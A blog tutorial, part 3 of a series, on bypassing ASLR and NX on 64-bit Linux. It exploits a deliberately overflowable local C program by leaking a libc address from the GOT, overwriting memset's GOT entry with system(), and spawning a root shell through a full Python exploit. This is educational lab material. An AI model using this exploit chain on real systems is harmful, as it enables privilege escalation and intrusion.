---
layout: post
title: "64-bit Linux stack smashing tutorial: Part 3"
date: 2016-03-18 10:05:02 -0400
comments: true
categories: howto hacking
---

It's been almost a year since I posted [part 2](/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/), and since then, I've received requests to write a follow up on how to bypass ASLR. There are quite a few ways to do this, and rather than go over all of them, I've picked one interesting technique that I'll describe here. It involves leaking a library function's address from the GOT, and using it to determine the addresses of other functions in libc that we can return to. 

Setup
--

The setup is identical to what I was using in part 1 and part 2. No new tools required. 

Leaking a libc address
--

Here's the source code for the binary we'll be exploiting: 

```c
/* Compile: gcc -fno-stack-protector leak.c -o leak          */
/* Enable ASLR: echo 2 > /proc/sys/kernel/randomize_va_space */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void helper() {
    asm("pop %rdi; pop %rsi; pop %rdx; ret");
}

int vuln() {
    char buf[150];
    ssize_t b;
    memset(buf, 0, 150);
    printf("Enter input: ");
    b = read(0, buf, 400);

    printf("Recv: ");
    write(1, buf, b);
    return 0;
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    vuln();
    return 0;
}
```

You can compile it yourself, or download the precompiled binary [here](https://gist.github.com/superkojiman/595524f6b96c79380568).

The vulnerability is in the vuln() function, where read() is allowed to write 400 bytes into a 150 byte buffer. With ASLR on, we can't just return to system() as its address will be different each time the program runs. The high level solution to exploiting this is as follows:

1. Leak the address of a library function in the GOT. In this case, we'll leak memset()'s GOT entry, which will give us memset()'s address. 
1. Get libc's base address so we can calculate the address of other library functions. libc's base address is the difference between memset()'s address, and memset()'s offset from libc.so.6. 
1. A library function's address can be obtained by adding its offset from libc.so.6 to libc's base address. In this case, we'll get system()'s address.
1. Overwrite a GOT entry's address with system()'s address, so that when we call that function, it calls system() instead. 

You should have a bit of an understanding on how shared libraries work in Linux. In a nutshell, the loader will initially point the GOT entry for a library function to some code that will do a slow lookup of the function address. Once it finds it, it overwrites its GOT entry with the address of the library function so it doesn't need to do the lookup again. That means the second time a library function is called, the GOT entry will point to that function's address. That's what we want to leak. For a deeper understanding of how this all works, I refer you to [PLT and GOT - the key to code sharing and dynamic libraries](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html). 

Let's try to leak memset()'s address. We'll run the binary under socat so we can communicate with it over port 2323:

```
# socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./leak
```

Grab memset()'s entry in the GOT: 

```
# objdump -R leak | grep memset
0000000000601030 R_X86_64_JUMP_SLOT  memset
```

Let's set a breakpoint at the call to memset() in vuln(). If we disassemble vuln(), we see that the call happens at 0x4006c6. So add a breakpoint in ~/.gdbinit:

```
# echo "br *0x4006c6" >> ~/.gdbinit
```

Now let's attach gdb to socat.

```
# gdb -q -p `pidof socat`
Breakpoint 1 at 0x4006c6
Attaching to process 10059
.
.
.
gdb-peda$ c
Continuing.
```

Hit "c" to continue execution. At this point, it's waiting for us to connect, so we'll fire up nc and connect to localhost on port 2323:

```
# nc localhost 2323
```

Now check gdb, and it will have hit the breakpoint, right before memset() is called.

```
   0x4006c3 <vuln+28>:  mov    rdi,rax
=> 0x4006c6 <vuln+31>:  call   0x400570 <memset@plt>
   0x4006cb <vuln+36>:  mov    edi,0x4007e4
```

Since this is the first time memset() is being called, we expect that its GOT entry points to the slow lookup function. 

```
gdb-peda$ x/gx 0x601030
0x601030 <memset@got.plt>:      0x0000000000400576
gdb-peda$ x/5i 0x0000000000400576
   0x400576 <memset@plt+6>:     push   0x3
   0x40057b <memset@plt+11>:    jmp    0x400530
   0x400580 <read@plt>: jmp    QWORD PTR [rip+0x200ab2]        # 0x601038 <read@got.plt>
   0x400586 <read@plt+6>:       push   0x4
   0x40058b <read@plt+11>:      jmp    0x400530
```

Step over the call to memset() so that it executes, and examine its GOT entry again. This time it points to memset()'s address:

```
gdb-peda$ x/gx 0x601030
0x601030 <memset@got.plt>:      0x00007f86f37335c0
gdb-peda$ x/5i 0x00007f86f37335c0
   0x7f86f37335c0 <memset>:     movd   xmm8,esi
   0x7f86f37335c5 <memset+5>:   mov    rax,rdi
   0x7f86f37335c8 <memset+8>:   punpcklbw xmm8,xmm8
   0x7f86f37335cd <memset+13>:  punpcklwd xmm8,xmm8
   0x7f86f37335d2 <memset+18>:  pshufd xmm8,xmm8,0x0
```

If we can write memset()'s GOT entry back to us, we'll receive it's address of 0x00007f86f37335c0. We can do that by overwriting vuln()'s saved return pointer to setup a ret2plt; in this case, write@plt. Since we're exploiting a 64-bit binary, we need to populate the RDI, RSI, and RDX registers with the arguments for write(). So we need to return to a ROP gadget that sets up these registers, and then we can return to write@plt.

I've created a helper function in the binary that contains a gadget that will pop three values off the stack into RDI, RSI, and RDX. If we disassemble helper(), we'll see that the gadget starts at 0x4006a1. Here's the start of our exploit:

```python
#!/usr/bin/env python

from socket import *
from struct import *

write_plt  = 0x400540            # address of write@plt
memset_got = 0x601030            # memset()'s GOT entry
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret

buf = ""
buf += "A"*168                  # padding to RIP's offset
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x1)          # stdout
buf += pack("<Q", memset_got)   # address to read from
buf += pack("<Q", 0x8)          # number of bytes to write to stdout
buf += pack("<Q", write_plt)    # return to write@plt

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

print s.recv(1024)              # "Enter input" prompt
s.send(buf + "\n")              # send buf to overwrite RIP
print s.recv(1024)              # receive server reply
d = s.recv(1024)[-8:]           # we returned to write@plt, so receive the leaked memset() libc address 
                                # which is the last 8 bytes in the reply

memset_addr = unpack("<Q", d)
print "memset() is at", hex(memset_addr[0])

# keep socket open so gdb doesn't get a SIGTERM
while True: 
    s.recv(1024)
```

Let's see it in action:

```
# ./poc.py
Enter input:
Recv:
memset() is at 0x7f679978e5c0

```

I recommend attaching gdb to socat as before and running poc.py. Step through the instructions so you can see what's going on. After memset() is called, do a "`p memset`", and compare that address with the leaked address you receive. If it's identical, then you've successfully leaked memset()'s address. 

Next we need to calculate libc's base address in order to get the address of any library function, or even a gadget, in libc. First, we need to get memset()'s offset from libc.so.6. On my machine, libc.so.6 is at /lib/x86_64-linux-gnu/libc.so.6. You can find yours by using ldd:

```
# ldd leak
        linux-vdso.so.1 =>  (0x00007ffd5affe000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff25c07d000)
        /lib64/ld-linux-x86-64.so.2 (0x00005630d0961000)
```

libc.so.6 contains the offsets of all the functions available to us in libc. To get memset()'s offset, we can use readelf:

```
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep memset
    66: 00000000000a1de0   117 FUNC    GLOBAL DEFAULT   12 wmemset@@GLIBC_2.2.5
   771: 000000000010c150    16 FUNC    GLOBAL DEFAULT   12 __wmemset_chk@@GLIBC_2.4
   838: 000000000008c5c0   247 FUNC    GLOBAL DEFAULT   12 memset@@GLIBC_2.2.5
  1383: 000000000008c5b0     9 FUNC    GLOBAL DEFAULT   12 __memset_chk@@GLIBC_2.3.4
```

memset()'s offset is at 0x8c5c0. Subtracting this from the leaked memset()'s address will give us libc's base address. 

To find the address of any library function, we just do the reverse and add the function's offset to libc's base address. So to find system()'s address, we get its offset from libc.so.6, and add it to libc's base address.

Here's our modified exploit that leaks memset()'s address, calculates libc's base address, and finds the address of system():

```python
# ./poc.py
#!/usr/bin/env python

from socket import *
from struct import *

write_plt  = 0x400540            # address of write@plt
memset_got = 0x601030            # memset()'s GOT entry
memset_off = 0x08c5c0            # memset()'s offset in libc.so.6
system_off = 0x046640            # system()'s offset in libc.so.6
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret

buf = ""
buf += "A"*168                  # padding to RIP's offset
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x1)          # stdout
buf += pack("<Q", memset_got)   # address to read from
buf += pack("<Q", 0x8)          # number of bytes to write to stdout
buf += pack("<Q", write_plt)    # return to write@plt

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

print s.recv(1024)              # "Enter input" prompt
s.send(buf + "\n")              # send buf to overwrite RIP
print s.recv(1024)              # receive server reply
d = s.recv(1024)[-8:]           # we returned to write@plt, so receive the leaked memset() libc address
                                # which is the last 8 bytes in the reply

memset_addr = unpack("<Q", d)
print "memset() is at", hex(memset_addr[0])

libc_base = memset_addr[0] - memset_off
print "libc base is", hex(libc_base)

system_addr = libc_base + system_off
print "system() is at", hex(system_addr)

# keep socket open so gdb doesn't get a SIGTERM
while True:
    s.recv(1024)
```

And here it is in action:

```
# ./poc.py
Enter input:
Recv:
memset() is at 0x7f9d206e45c0
libc base is 0x7f9d20658000
system() is at 0x7f9d2069e640

```

Now that we can get any library function address, we can do a ret2libc to complete the exploit. We'll overwrite memset()'s GOT entry with the address of system(), so that when we trigger a call to memset(), it will call system("/bin/sh") instead. Here's what we need to do:

1. Overwrite memset()'s GOT entry with the address of system() using read@plt. 
1. Write "/bin/sh" somewhere in memory using read@plt. We'll use 0x601000 since it's a writable location with a static address.
1. Set RDI to the location of "/bin/sh" and return to system(). 

Here's the final exploit:

```python
#!/usr/bin/env python

import telnetlib
from socket import *
from struct import *

write_plt  = 0x400540            # address of write@plt
read_plt   = 0x400580            # address of read@plt
memset_plt = 0x400570            # address of memset@plt
memset_got = 0x601030            # memset()'s GOT entry
memset_off = 0x08c5c0            # memset()'s offset in libc.so.6
system_off = 0x046640            # system()'s offset in libc.so.6
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret
writeable  = 0x601000            # location to write "/bin/sh" to

# leak memset()'s libc address using write@plt
buf = ""
buf += "A"*168                  # padding to RIP's offset
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x1)          # stdout
buf += pack("<Q", memset_got)   # address to read from
buf += pack("<Q", 0x8)          # number of bytes to write to stdout
buf += pack("<Q", write_plt)    # return to write@plt

# payload for stage 1: overwrite memset()'s GOT entry using read@plt
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x0)          # stdin
buf += pack("<Q", memset_got)   # address to write to
buf += pack("<Q", 0x8)          # number of bytes to read from stdin
buf += pack("<Q", read_plt)     # return to read@plt

# payload for stage 2: read "/bin/sh" into 0x601000 using read@plt
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x0)          # junk
buf += pack("<Q", writeable)    # location to write "/bin/sh" to
buf += pack("<Q", 0x8)          # number of bytes to read from stdin
buf += pack("<Q", read_plt)     # return to read@plt

# payload for stage 3: set RDI to location of "/bin/sh", and call system()
buf += pack("<Q", pop3ret)      # pop rdi; ret
buf += pack("<Q", writeable)    # address of "/bin/sh"
buf += pack("<Q", 0x1)          # junk
buf += pack("<Q", 0x1)          # junk
buf += pack("<Q", memset_plt)   # return to memset@plt which is actually system() now

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

# stage 1: overwrite RIP so we return to write@plt to leak memset()'s libc address
print s.recv(1024)              # "Enter input" prompt
s.send(buf + "\n")              # send buf to overwrite RIP
print s.recv(1024)              # receive server reply
d = s.recv(1024)[-8:]           # we returned to write@plt, so receive the leaked memset() libc address 
                                # which is the last 8 bytes in the reply

memset_addr = unpack("<Q", d)
print "memset() is at", hex(memset_addr[0])

libc_base = memset_addr[0] - memset_off
print "libc base is", hex(libc_base)

system_addr = libc_base + system_off
print "system() is at", hex(system_addr)

# stage 2: send address of system() to overwrite memset()'s GOT entry
print "sending system()'s address", hex(system_addr)
s.send(pack("<Q", system_addr))

# stage 3: send "/bin/sh" to writable location
print "sending '/bin/sh'"
s.send("/bin/sh")

# get a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

I've commented the code heavily, so hopefully that will explain what's going on. If you're still a bit confused, attach gdb to socat and step through the process. For good measure, let's run the binary as the root user, and run the exploit as a non-priviledged user: 

```
koji@pwnbox:/root/work$ whoami
koji
koji@pwnbox:/root/work$ ./poc.py
Enter input:
Recv:
memset() is at 0x7f57f50015c0
libc base is 0x7f57f4f75000
system() is at 0x7f57f4fbb640
+ sending system()'s address 0x7f57f4fbb640
+ sending '/bin/sh'
whoami
root
```

Got a root shell and we bypassed ASLR, and NX! 

We've looked at one way to bypass ASLR by leaking an address in the GOT. There are other ways to do it, and I refer you to the [ASLR Smack & Laugh Reference](https://ece.uwaterloo.ca/~vganesh/TEACHING/S2014/ECE458/aslr.pdf) for some interesting reading. Before I end off, you may have noticed that you need to have the correct version of libc to subtract an offset from the leaked address in order to get libc's base address. If you don't have access to the target's version of libc, you can attempt to identify it using [libc-database](https://github.com/niklasb/libc-database). Just pass it the leaked address and hopefully, it will identify the libc version on the target, which will allow you to get the correct offset of a function.
